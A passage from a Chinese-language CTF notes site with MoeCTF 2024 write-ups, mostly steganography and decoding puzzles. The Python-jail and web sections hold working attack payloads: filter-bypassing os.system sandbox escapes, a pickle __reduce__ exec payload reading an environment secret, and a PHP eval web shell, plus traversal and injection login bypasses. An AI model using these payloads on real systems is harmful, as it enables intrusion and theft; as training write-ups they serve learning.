with:\nwelcome_msg = conn.recvuntil(b\"to continue:\").decode()\nprint(welcome_msg)\n\n# print(welcome_msg)\n# \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u9700\u8981\u62fc\u63a5\u7684\u5b57\u7b26\u4e32\nmatch = re.search(r\"Please enter '(\\w+)'\\+'(\\w+)'=\\? to continue:\", welcome_msg)\nif match:\n    str1, str2 = match.groups()\n    answer = str1 + str2 + \"\\n\"\n    conn.send(answer.encode())\nelse:\n    print(\"Failed to match the required strings\")\n    conn.close()\n    exit(1)\n\nprint(conn.recvline().decode())\n\n\ndef send_receive(command):\n    conn.sendline(command.encode())\n    while True:\n        try:\n            received = conn.recv(4096).decode()\n            if not received:\n                break\n            print(received, end=\"\")\n        except EOFError:\n            break\n\n\ncommands = []\ncommands.append(\"\")  # \u4f9d\u636e\u9700\u8981\u6dfb\u52a0\u6307\u4ee4\n\nfor com in commands:\n    send_receive(com)\n\n# \u5173\u95ed\u8fde\u63a5\nconn.close()\n</code></pre> <p>\u6211\u4eec\u53ea\u9700\u8981\u4fee\u6539 port \u548c commands \u5373\u53ef\u3002</p> <p>if re.search(r'[\"\\'0-8bd]|[^\\x00-\\xff]', code): print(\"Nope\")</p> <p>\u6bd4\u8d5b\u65f6\u6211\u5199\u7684\u547d\u4ee4\u975e\u5e38\u4e11\u964b\uff1a</p> <pre><code># ls\ncommands.append(\n    \"__import__(list(type({})(os=9))[False]).system(list(type({})(ls=9))[False])\"\n)\n# ls /tmp\n# commands.append(\n#     \"__import__(list(type({})(os=9))[False]).system(list(type({})(ls=9))[False]+chr(len(list(type({})(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=()))[len([])]))+chr(len(list(type({})(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=()))[len([])]))+list(type({})(tmp=9))[False])\"\n# )\n# # cat /tmp/*\n# commands.append(\n#     \"__import__(list(type({})(os=9))[False]).system(list(type({})(cat=9))[False]+chr(len(list(type({})(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=()))[len([])]))+chr(len(list(type({})(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=()))[len([])]))+list(type({})(tmp=9))[False]+chr(len(list(type({})(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=()))[len([])]))+chr(len(list(type({})(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=()))[len([])])))\"\n# )\n</code></pre> <p>\u5206\u4e09\u6b21\u6267\u884c\u4e86\u8fd9\u4e09\u6761 python \u547d\u4ee4\uff0c\u5c45\u7136\u4e5f\u8fc7\u4e86\u3002</p> <p>\u540e\u6765\u53d1\u73b0\u6709\u7b80\u5355\u5730\u591a\u7684\uff1a</p> <pre><code>commands.append(\"eval(input())\")\n\ncommands.append(\"__import__('os').system('cat /tmp/*')\")\n</code></pre> <p>Flag</p> <p>moectf{YOu_CaN-Byp@s5-tH3-5TrING_FIlTEr_6y-NUm_TO-cHR2e}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#lv25","title":"lv2.5","text":"<p>if re.search(r'[\"\\'0-8bdhosxy_]|[^\\x00-\\xff]', code): print(\"Nope\")</p> <p>if len(code) &gt; 15: print(\"Too long\")</p> <p>\u8fd9\u4e48\u77ed\uff0c\u8fd8\u8fc7\u6ee4\u90a3\u4e48\u591a\uff0c\u504f\u504f\u4e0a\u9762\u90a3\u79cd\u5feb\u6377\u89e3\u6cd5\u8fd8\u80fd\u8fc7\uff1a</p> <p>Flag</p> <p>moectf{sOm3tlM35_lNPut-C4N_BE_@_m3Th0D_tO_BypaSs_f11t3rs0}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#lv3","title":"lv3","text":"<p>if re.search(r\"[A-z0-9]\", code): print(\"Nope\")</p> lv3.py<pre><code>commands.append(\"\ud835\ude26\ud835\ude39\ud835\ude26\ud835\ude24(\ud835\ude2a\ud835\ude2f\ud835\ude31\ud835\ude36\ud835\ude35())\")\ncommands.append(\"__import__('os').system('cat /tmp/*')\")\n</code></pre> <p>Flag</p> <p>moectf{p3p_AILOW_You_U5E-uNIcOd3-cHar_@S_AsC1I_On3sd}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#lv4","title":"lv4","text":"lv4<pre><code>commands.append(\n    \"[i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == '_wrap_close'][0].__init__.__globals__['system']('cat /tmp/*')\"\n)\n</code></pre> <p>Flag</p> <p>moectf{Y0U_C4N_REcoVEr-glO64ls_AnD_bUilTInS-from-CuSTom-functions0}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#the-upside-and-down","title":"The upside and down","text":"<p>\u53ea\u80fd\u8bf4\u81ea\u5df1\u5bf9\u6587\u4ef6\u7684 16 \u8fdb\u5236\u683c\u5f0f\u4e0d\u591f\u719f\u6089\uff0c\u6253\u5f00\u540e\u4e60\u60ef\u6027\u5c31\u53bb\u770b\u5bf9\u5e94\u7684 string \u90e8\u5206\u3002</p> <p>\u6587\u4ef6\u7684 the_upside_and_down.hex \u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f46\u662f\u5176\u7ed3\u5c3e\u4ee5 16 \u8fdb\u5236\u6570\u5b57\u53cd\u8fc7\u6765\u770b\u5c31\u662f\u4e00\u4e2a png \u56fe\u7247\u7684\u9b54\u6570\u5934\u4e86</p> <p></p> <p>\u6240\u4ee5\u5c06\u5176\u9006\u5e8f\u5199\u5165 png \u5373\u53ef\uff1a</p> reverse.py<pre><code>with open(\"the_upside_and_down.hex\", \"rb\") as f, open(\"reverse.png\", \"wb\") as w:\ncontent = f.read().hex()[::-1]\nw.write(bytes.fromhex(content))\n</code></pre> <p>\u6253\u5f00\u662f\u4e00\u5f20\u4e8c\u7ef4\u7801\u56fe\u7247\uff0c\u626b\u7801\u83b7\u5f97 flag\uff1a</p> <p>Flag</p> <p>moectf{Fri3nds_d0n't_lie!}</p> <p>python jail \u90e8\u5206\u5355\u72ec\u653e\u5728 MISC/pyjial.md \u4e2d\uff0c\u4e0b\u9762\u7684\u5185\u5bb9\u4e3a\u6bd4\u8d5b\u65f6\u89e3\u51fa\u7684\u90e8\u5206\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_4","title":"\u62fc\u56fe\u7f94\u624b","text":"<p>\u56fe\u7247\u53d8\u4e3a 4x4 \uff0c\u7b80\u5355\u7684 python \u4ee3\u7801\u5c31\u4e0d\u80fd\u591f\u5e2e\u52a9\u6211\u4eec\u62fc\u56fe\u4e86\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u5de5\u5177 gaps\uff0c\u6211\u4eec\u628a\u56fe\u7247\u62fc\u4e3a\u4e00\u5f20\u56fe tmp.png \u540e\uff0c\u8fd0\u884c\uff1a</p> <pre><code>gaps run tmp.png solution.png --generations=20 --population=600 --size=122\n</code></pre> <p>\u5373\u53ef\u62ff\u5230\u4e8c\u7ef4\u7801\uff0c\u626b\u7801\u5f97\u5230\uff1a</p> <p><code>balabalbalablbalblablbalabala//nihaopintugaoshou//encoded_flag{71517ysd%ryxsc!usv@ucy*wqosy*qxl&amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs}</code></p> <p>\u6839\u636e encode.py \u548c StrangeCharacterHint \uff0c\u505a\u51fa\u4e86\u5982\u4e0b\u89e3\u7801\u811a\u672c\uff1a</p> decode.py<pre><code># https://ctf.xidian.edu.cn/games/10/challenges?challenge=123\n\ndef self_decode(encoded_text):\n    code_setting_first = \"doanythigfruebcjklmqpswvxz\"\n    code_setting_sec = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    number_setting = \"0123456789\"\n    decoded_text = \"\"\n\n    for char in encoded_text:  # \u5904\u7406\u975e\u6570\u5b57\u90e8\u5206\n        if char in code_setting_first:\n            if 116 &lt;= ord(char) &lt;= 122:\n                decoded_text += chr(ord(char) - 19)\n            elif 97 &lt;= ord(char) &lt;= 103:\n                decoded_text += chr(ord(char) + 19)\n            elif 104 &lt;= ord(char) &lt;= 115:\n                decoded_text += chr(219 - ord(char))\n        elif char in code_setting_sec:\n            if 72 &lt;= ord(char) &lt;= 78:\n                decoded_text += chr(ord(char) - 7)\n            elif 65 &lt;= ord(char) &lt;= 71:\n                decoded_text += chr(ord(char) + 7)\n            elif 88 &lt;= ord(char) &lt;= 90:\n                decoded_text += chr(ord(char) - 9)\n            elif 79 &lt;= ord(char) &lt;= 81:\n                decoded_text += chr(ord(char) + 9)\n            elif 81 &lt;= ord(char) &lt;= 86:\n                decoded_text += chr(168 - ord(char))\n        elif char not in number_setting:\n            decoded_text += char\n\n    import re\n\n    # \u5904\u7406\u6570\u5b57\u90e8\u5206\n    # \u4f7f\u7528\u6b63\u5219\u5339\u914dencoded_text\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6570\u5b57\uff0c\u5e76\u83b7\u53d6\u5176\u4e4b\u540e\u7684\u6240\u6709\u6570\u5b57\u5199\u5165 numbers \u5b57\u7b26\u4e32\u4e2d\uff0c\u6ca1\u6709\u6570\u5b57\u5219\u8fd4\u56de\u539f\u6587\u672c\n    numbers = re.findall(r\"\\d+\", encoded_text)\n    if numbers:\n        numbers = numbers[0]\n    else:\n        return decoded_text\n    # print(numbers)\n    reversed_numbers = numbers[::-1]\n    reversed_decode_numbers = last = numbers[0]\n    for i in range(1, len(reversed_numbers)):\n        last = str(int(numbers[i]) ^ int(last))\n        reversed_decode_numbers += last\n    decoded_text += reversed_decode_numbers[::-1]\n\n    return decoded_text\n\n\n# \u4f7f\u7528\u51fd\u6570\nreversed_encode_flag = \"71517ysd%ryxsc!usv@ucy*wqosy*qxl&amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs\"[\n    ::-1\n]\n\n# key = \"xixsdxnlUmXixunbGsardftaUixavtitsJxzmtiaU\"\n# reverse_key = \"xixsdxnlUmXixunbGsardftaUixavtitsJxzmtiaU\"[::-1]\n# decoded_key = self_decode(reverse_key)\n# print(decoded_key) \"StrangeCharacterStaywithNumberOnSomewhere\"\n\ndecoded_flag = self_decode(reversed_encode_flag)\nprint(\"moectf{\" + decoded_flag + \"}\")\n# moectf{hs@dkj!dfhf$kdjfh$ud^hfuh*oeh&amp;oej*fhljd*fvb@chb!vhefi%whf52367}\nalphabet = \"\"\nstrange_character = \"\"\nnums = \"\"\nfor char in decoded_flag:\n    if char in \"doanythigfruebcjklmqpswvxz\":\n        alphabet += char\n    elif char in \"0123456789\":\n        nums += char\n    else:\n        strange_character += char\n\nprint(\"moectf{\" + alphabet + strange_character + nums + \"}\")\nprint(\"moectf{\" + alphabet + nums + strange_character + \"}\")\n# moectf{hsdkjdfhfkdjfhudhfuhoehoejfhljdfvbchbvhefiwhf@!$$^*&amp;**@!%52367}\n# moectf{hsdkjdfhfkdjfhudhfuhoehoejfhljdfvbchbvhefiwhf52367@!$$^*&amp;**@!%}\n</code></pre> <p>\u4f46\u662f\uff0c\u8fd9\u4e09\u4e2a\u7ed3\u679c\u90fd\u662f\u9519\u8bef\u7684\u3002\u901a\u8fc7\u201c\u9524\u5b50\u201d\u5c1d\u8bd5\u83b7\u53d6\u5e2e\u52a9\uff0c\u7ba1\u7406\u5458\u7ed9\u6211\u7684\u63d0\u793a\u662f\uff1a\u201cStrangeCharacterStaywithNumberOnSomewhere \u8fd9\u91cc\u7684\u6570\u5b57\u4e0d\u662fflag\u91cc\u9762\u51fa\u73b0\u7684\u6570\u5b57\u5982\u679c\u4f60\u4e70\u8fd9\u9898hint\u4e86\u4f60\u4f1a\u77e5\u9053\u8fd9\u91cc\u6570\u5b57\u548c\u5b57\u6bcd\u662f\u4e92\u76f8\u7f6e\u6362\u7684\u4f46\u8fd9\u4e2a\u5bf9\u5e94\u7684\u6570\u5b57\u9700\u8981\u4f60\u53bb\u627e\u6545\u800c\u8fd9\u4e2ahint\u5c31\u662f\u6570\u5b57\u548c\u5b57\u6bcd\u7684\u5bf9\u5e94\u5173\u7cfb\u7684\u5c55\u793a\u201d </p> <p>\u8d2d\u4e70 hint: \u201cstrange character\u4e0d\u80fd\u73b0\u8eabflag\uff0c\u5bf9\u5e94\u7684\u6570\u5b57\u603b\u662f\u4f5c\u4e3a\u4ed6\u7684\u66ff\u8eab\u73b0\u8eabflag\u201d \u3002</p> <p>\u5c1d\u8bd5\u4e86 ascii \u7801\uff0c\u663e\u7136\u5931\u8d25\u4e86\u3002</p> <p>\u6700\u540e\u5728\u4ea4\u6d41\u4e2d\uff0c\u60f3\u5230\u952e\u76d8\u4e0a\u7684\u6309\u952e\uff08F1\u3001F2 \u7b49\u6309\u952e\u4e0b\u9762\u90a3\u4e00\u884c\uff09\u7684\u6620\u5c04\uff0c\u8fc7\u5173\u3002</p> <p>Flag</p> <p>moectf{hs2dkj1dfhf4kdjfh4ud6hfuh8oeh7oej8fhljd8fvb2chb1vhefi5whf52367}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#300","title":"\u6bcf\u4eba\u81f3\u5c11300\u4efd","text":"<p>\u89e3\u538b\u7f29\u5305\uff0c\u83b7\u5f97 9 \u4e2a\u62fc\u56fe\u548c\u4e00\u4e2a encode.txt \u4ee5\u53ca encode0.py \u3002</p> img_puzzle.py<pre><code>from PIL import Image\nimport numpy as np\nimport os\n\n\ndef get_edge(image, edge):\n    if edge == \"left\":\n        return np.array(image)[:, 0]\n    elif edge == \"right\":\n        return np.array(image)[:, -1]\n    elif edge == \"top\":\n        return np.array(image)[0, :]\n    elif edge == \"bottom\":\n        return np.array(image)[-1, :]\n\n\ndef edge_difference(edge1, edge2):\n    return np.sum(np.abs(edge1 - edge2))\n\n\ndef find_best_match(target_edge, images, edge_type):\n    best_match = None\n    best_score = float(\"inf\")\n    for img in images:\n        score = edge_difference(target_edge, get_edge(img, edge_type))\n        if score &lt; best_score:\n            best_score = score\n            best_match = img\n    return best_match, best_score\n\n\ndef reconstruct_qr(input_folder, output_file):\n    image_files = [\n        f for f in os.listdir(input_folder) if f.endswith(\".png\") or f.endswith(\".jpg\")\n    ]\n    images = [\n        Image.open(os.path.join(input_folder, f)).convert(\"RGB\") for f in image_files\n    ]\n\n    tile_width, tile_height = images[0].size\n    result_image = Image.new(\"RGB\", (tile_width * 3, tile_height * 3))\n\n    # Find top-left corner (usually contains a positioning square)\n    top_left = max(images, key=lambda img: np.sum(np.array(img)[:10, :10] == 0))\n    result_image.paste(top_left, (0, 0))\n    images.remove(top_left)\n\n    # Complete first row\n    for i in range(1, 3):\n        target_edge = get_edge(\n            result_image.crop((tile_width * (i - 1), 0, tile_width * i, tile_height)),\n            \"right\",\n        )\n        best_match, _ = find_best_match(target_edge, images, \"left\")\n        result_image.paste(best_match, (tile_width * i, 0))\n        images.remove(best_match)\n\n    # Complete first column\n    for i in range(1, 3):\n        target_edge = get_edge(\n            result_image.crop((0, tile_height * (i - 1), tile_width, tile_height * i)),\n            \"bottom\",\n        )\n        best_match, _ = find_best_match(target_edge, images, \"top\")\n        result_image.paste(best_match, (0, tile_height * i))\n        images.remove(best_match)\n\n    # Complete remaining tiles\n    for row in range(1, 3):\n        for col in range(1, 3):\n            left_edge = get_edge(\n                result_image.crop(\n                    (\n                        tile_width * (col - 1),\n                        tile_height * row,\n                        tile_width * col,\n                        tile_height * (row + 1),\n                    )\n                ),\n                \"right\",\n            )\n            top_edge = get_edge(\n                result_image.crop(\n                    (\n                        tile_width * col,\n                        tile_height * (row - 1),\n                        tile_width * (col + 1),\n                        tile_height * row,\n                    )\n                ),\n                \"bottom\",\n            )\n\n            best_match = None\n            best_score = float(\"inf\")\n            for img in images:\n                score = edge_difference(\n                    left_edge, get_edge(img, \"left\")\n                ) + edge_difference(top_edge, get_edge(img, \"top\"))\n                if score &lt; best_score:\n                    best_score = score\n                    best_match = img\n\n            result_image.paste(best_match, (tile_width * col, tile_height * row))\n            images.remove(best_match)\n\n    result_image.save(output_file)\n    print(f\"Reconstructed QR code saved as {output_file}\")\n\n\n# \u4f7f\u7528\u51fd\u6570\ninput_folder = \"imgs/\"\noutput_file = \"reconstructed_qr.png\"\nreconstruct_qr(input_folder, output_file)\n</code></pre> <p>\u5bf9\u4e8e\u62fc\u56fe\uff0c\u7528\u4e0a\u9762\u7684\u7b80\u5355\u811a\u672c\u83b7\u53d6\uff0c\u626b\u7801\u5f97\uff1b</p> <p><code>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}??</code></p> <p>\u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u6709\u4e00\u4e2a \"base58\" \uff0c\u5c06 <code>3FgQG9ZFteHzw7W42</code> \u7528 base58 \u89e3\u7801\u540e\u5c1d\u8bd5\u63d0\u4ea4\uff0c\u901a\u8fc7\u4e86\u2026\u2026</p> <p>Flag</p> <p>moectf{we1rd_qrc0d3}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_5","title":"\u89e3\u4e0d\u5b8c\u7684\u538b\u7f29\u5305","text":"<p>\u5728 ctf101 \u4e2d ruru \u4e0e\u4e4b\u7c7b\u4f3c\uff0c\u5f53\u65f6\u8fd8\u6709\u4f2a\u52a0\u5bc6\uff0c\u8fd9\u91cc\u6ca1\u6709\uff1b\u4f7f\u7528 python \u811a\u672c\u9012\u5f52\u89e3\u538b\u7f29\u5373\u53ef\uff1b\u6700\u540e\u83b7\u5f97\u4e00\u4e2a cccccccrc.zip \uff0c\u8003\u8651\u5230\u5176\u4e2d\u6709\u56db\u4e2a\u7b49\u5927\u7684\u5c0f\u6587\u672c\uff0c\u540c\u65f6\u538b\u7f29\u5305\u540d\u5b57\u4e5f\u662f\u63d0\u793a\uff0c\u5b66\u4e60\u5230\u8fd9\u662f crc \u78b0\u649e\uff0c\u4f7f\u7528 CRC32-Tools \u89e3\u5f00\u5373\u53ef\uff0c\u83b7\u53d6\u5bc6\u7801\uff1a<code>*m:#P7j0</code> \uff0c\u89e3\u5f00\u538b\u7f29\u5305\u83b7\u5f97\uff1a</p> <p>Flag</p> <p>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#find-it","title":"Find It","text":"<p>\u56fe\u4e2d\u7ed9\u51fa\u4e86\u5f88\u591a\u5927\u516c\u53f8\u540d\u79f0\uff1a\u96c4\u5cf0\u96c6\u56e2\u3001\u6854\u5b50\u6c34\u6676\u9152\u5e97\uff0c\u5b9a\u4f4d\u5230\u5c0f\u533a\uff1a\u201c\u65ed\u666f\u5d07\u76db\u56ed\u201d\uff1b\u627e\u5230\u5e7c\u513f\u56ed\uff1a\u201c\u5409\u7684\u5821\u65ed\u666f\u5d07\u76db\u5e7c\u513f\u56ed\u201d \u201c\u5409\u7684\u5821\u82f1\u4f73\u5e7c\u513f\u56ed\u201d</p> <p>Flag</p> <p>moectf{ji_di_bao_you_er_yuan}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#the_secret_of_snowball","title":"the_secret_of_snowball","text":"<p>JPG \u56fe\u50cf\u635f\u5bb3\uff0c\u4fee\u6539\u5f00\u5934\u7684\u6a21\u6570\u5373\u53ef =&gt; <code>Welc0me_t0_the_sec</code></p> <p>\u7ee7\u7eed\u67e5\u770b\uff0c\u672b\u5c3e\u6709 base64\uff0c\u89e3\u7801 =&gt; <code>ret_life_0f_Misc!</code></p> <p>Flag</p> <p>moectf{Welc0me_t0_the_secret_life_0f_Misc!}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#ez_f5","title":"ez_F5","text":"<p>\u6839\u636e\u9898\u76ee\u540d\u79f0\u548c\u5176\u4e2d\u7684 copyright \u53ef\u4ee5\u77e5\u9053\u662f F5 \u52a0\u5bc6 (\u6ce8\u610f\u56fe\u7247\u5c5e\u6027\u83b7\u53d6\u5bc6\u7801\uff1b\u4f7f\u7528 java 8)\u3002</p> <p>Flag</p> <p>moectf{F5_15_s0_lntere5t1n9}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_6","title":"\u7f57\u5c0f\u9ed1\u6218\u8bb0","text":"<p>\u5b9e\u8bdd\u8bf4\u7b2c\u4e00\u6b21\u505a gif \u9898\uff0c\u4f46\u662f\u770b\u5b8c\u4e00\u904d\u5f88\u663e\u7136\u67d0\u51e0\u5e27\u6709\u4e1c\u897f\uff0c\u63d0\u53d6\u51fa\u6765\u770b\u770b\u5c31\u597d\uff0c\u626b\u4e8c\u7ef4\u7801\u3002</p> <p>Flag</p> <p>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#_7","title":"\u6742\u9879\u5165\u95e8\u6307\u5317","text":"<p>\u62ff\u5230\u56fe\u7247\u786e\u5b9e\u662f\u4e60\u60ef\u4e8e\u7784\u4e00\u773c\uff0c\u7136\u540e\u53bb\u770b\u9690\u5199\u3002\u770b\u4e86\u534a\u5929\uff0c\u6ca1\u4e1c\u897f\u3002\u7a81\u7136\u4e00\u5806\u5b9e\u7ebf\u4e2d\u6709\u4e00\u6bb5\u865a\u7ebf\uff0c\u6309\u7167\u5b57\u6bcd\u5c06\u56fe\u7247\u65cb\u8f6c =&gt; <code>.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .</code></p> <p>Flag</p> <p>moectf{H4VE_A_G00D_T1ME}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#ez_forensics","title":"ez_Forensics","text":"<p>\u8003\u5bdf\u5185\u5b58\u53d6\u8bc1\uff0c\u5148\u590d\u4e60\u4e00\u4e0b</p> <p>\u67e5\u770b\u547d\u4ee4\u884c\u4fe1\u606f\uff0c\u5f97\u5230 flag\uff1a</p> <p>Flag</p> <p>moectf{WWBGY-TLVC5-XKYBZ}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/MISC/#abnormal-flag","title":"Abnormal flag","text":"<p>audacity \u67e5\u770b\u9891\u8c31\u56fe</p> <p>Flag</p> <p>moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}</p> <ol> <li> <p>\u4f60\u90fd\u5199 misc \u4e86\uff0c\u4f1a\u70b9 pwn \u600e\u4e48\u4e86\uff08\uff09\u00a0\u21a9</p> </li> </ol>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/","title":"WEB","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#petstore","title":"PetStore","text":"<p>\u770b\u534a\u5929\u662f\u770b\u4e0d\u61c2\u7684\uff0c\u6839\u636e\u63d0\u793a</p> <p>Todo</p> <ul> <li>Pickle\u53cd\u5e8f\u5217\u5316</li> </ul> <p>\u7ed3\u5408\u4e0a\u9762\u7684\u6587\u7ae0\uff0c\u518d\u770b\u6e90\u7801\u4e2d\u7684\u5173\u4e8e import \u7684\u4ee3\u7801\uff0c\u6709\uff1a</p> petStore<pre><code>import base64\nimport pickle\n\nclass Test:\n    def __reduce__(self):\n        return (exec, (\"import os; store.create_pet(os.getenv('FLAG'), 'flag');\",))\n\nif __name__ == \"__main__\":\n    print(base64.b64encode(pickle.dumps(Test())).decode(\"utf-8\"))\n\n# gASVUwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw3aW1wb3J0IG9zOyBzdG9yZS5jcmVhdGVfcGV0KG9zLmdldGVudignRkxBRycpLCAnZmxhZycpO5SFlFKULg==\n</code></pre> <p>\u5c06\u5176\u5728 \u201cImport a Pet\u201d \u4e2d\u5bfc\u5165\u540e\uff0c\u53ef\u4ee5\u5728 \u201ccurrent Pet\u201d \u4e2d\u770b\u5230 flag</p> <p>Flag</p> <p>moectf{5t4rRYmEOW' s_fLAG-H4s_b33n_ACCEPted-Ac4c@c @Ca}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#_1","title":"\u57ab\u5200\u4e4b\u8def","text":"","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#01-moectf","title":"01 MoeCTF\uff1f\u542f\u52a8\uff01","text":"<p>\u5df2\u7ecf\u83b7\u53d6\u4e86 shell \u5f53\u7136\u662f\u770b\u770b\u6240\u6709\u7684\u4e1c\u897f\u4e86\u3002</p> <p>\u5148\u662f <code>ls /</code> \u53d1\u73b0 <code>flag flag.sh</code> \uff0c\u4f7f\u7528 <code>cat</code> \u67e5\u770b\uff0c\u63d0\u793a\u6211\u4eec\u770b\u4e0b\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u4e60\u60ef\u6027\u4f7f\u7528 <code>echo $PATH</code> \uff0c\u6ca1\u6709\u4e1c\u897f\uff1b\u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u4f7f\u7528 <code>env</code> \u6216\u8005\u662f <code>set</code> \u5c31\u597d\u4e86\u3002</p> <ul> <li>env\u547d\u4ee4\u00a0\u7528\u4e8e\u663e\u793a\u7cfb\u7edf\u4e2d\u5df2\u5b58\u5728\u7684\u73af\u5883\u53d8\u91cf\uff0c\u4ee5\u53ca\u5728\u5b9a\u4e49\u7684\u73af\u5883\u4e2d\u6267\u884c\u6307\u4ee4\uff1b</li> <li>set\u547d\u4ee4\u00a0\u4f5c\u7528\u4e3b\u8981\u662f\u663e\u793a\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u5b58\u5728\u7684shell\u53d8\u91cf\u3002</li> </ul> <p>Flag</p> <p>moectf{WELCOM3_TO_MoeCtf_aNd_RoaDI_5tArTUp-bY-SxRHHH69}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#02","title":"02 \u666e\u901a\u7684\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u6d45\u8c08php\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <p>\u5b8c\u5168\u6ca1\u6709\u8fc7\u6ee4\uff0c\u90a3\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u4e0a\u4f20\u5305\u542b\u4e00\u53e5\u8bdd\u6728\u9a6c <code>&lt;?php @eval ($_POST['1']);</code> \u7684 1.php \u6587\u4ef6\uff0c\u5e76\u4f7f\u7528\u4e2d\u56fd\u8681\u5251\u8fde\u63a5\u3002</p> <p>\u5f53\u7136\uff0c\u53c2\u8003\u4e8e\u7b2c\u4e00\u9898 flag \u5728\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u6211\u4eec\u76f4\u63a5\u4ee5 POST \u7684\u5f62\u5f0f\u63d0\u4ea4 <code>1=phpinfo();</code>  \u5c31\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\uff0c\u4e4b\u540e <code>ctrl+f</code> \u67e5\u627e\u5373\u53ef\u3002</p> <p>Flag</p> <p>moectf{wo_wang_ji_le}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#03","title":"03 \u8fd9\u662f\u4e00\u4e2a\u56fe\u5e8a","text":"<p>\u6293\u5305\u7ed5\u8fc7\u3002</p> <p>Flag</p> <p>moectf{bYP@S5-tHE_MImE_tyPE_@nd-ExTen5i0N-y0u_C@N-Do-It2}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#04","title":"04 \u4e00\u4e2a\u6587\u4ef6\u6d4f\u89c8\u5668","text":"<p>\u5141\u8bb8\u6839\u636e\u8def\u5f84\u83b7\u53d6\u6587\u4ef6\uff08\u5939\uff09\uff0c\u76f4\u63a5\u76ee\u5f55\u7a7f\u900f\u5230\u6839\u76ee\u5f55\u4e0b\uff0c\u5728 tmp/flag \u4e0b\u627e\u5230\uff1a</p> <p>Flag</p> <p>moectf{Cr0sS-THe_D1RECtory_AnD_yoU_MaY_fIND_eTc-PaSSWD13}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#05","title":"05 \u767b\u9646\u7f51\u7ad9","text":"<p>\u767b\u5165\u2026\u2026\u56de\u60f3 zjubus \u4e0a\u7684\u65e5\u54edschool-bus\uff0c\u6211\u4eec\u53ea\u77e5\u9053\u7528\u6237\u540d\u4e5f\u80fd\u591f\u767b\u5165\uff0c\u56e0\u4e3a\u53ef\u4ee5\u5c06\u540e\u9762\u5168\u90e8\u6ce8\u91ca\u6389\u3002\u4f46\u662f\u6b64\u5904\u7684\u767b\u5165\u6bd4\u8f83\u5947\u602a\uff0c\u6211\u4eec\u8f93\u5165\u540e\u70b9\u51fb\u767b\u5f55\uff0c\u663e\u793a\u767b\u5165\u5931\u8d25\u540e\uff0c\u4f7f\u7528 hackbar LOAD \u5374\u6ca1\u6709\u6548\u679c\u3002\u67e5\u770b\u6e90\u7801\u53d1\u73b0\uff1a</p> <pre><code>&lt;script&gt;\n    function login() {\n        $.ajax({\n            type: \"post\",\n            dataType: \"text\",\n            url: \"login.php\",\n            data: $('#form').serialize(),\n            success: function (result) {\n                console.log(result)\n                $('#span_result').html(result)\n            },\n            error: function (result) {\n                console.log(result)\n                $('#span_result').html(result)\n            },\n        });\n    }\n&lt;/script&gt;\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u662f\u4ee5 post \u7684\u5f62\u5f0f login.php \u7684\u7f51\u5740\u53d1\u9001\u4e86\u8bf7\u6c42\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 url \u6539\u4e3a <code>localhost:port/login.php</code> \uff0c\u7136\u540e\u4ee5 post 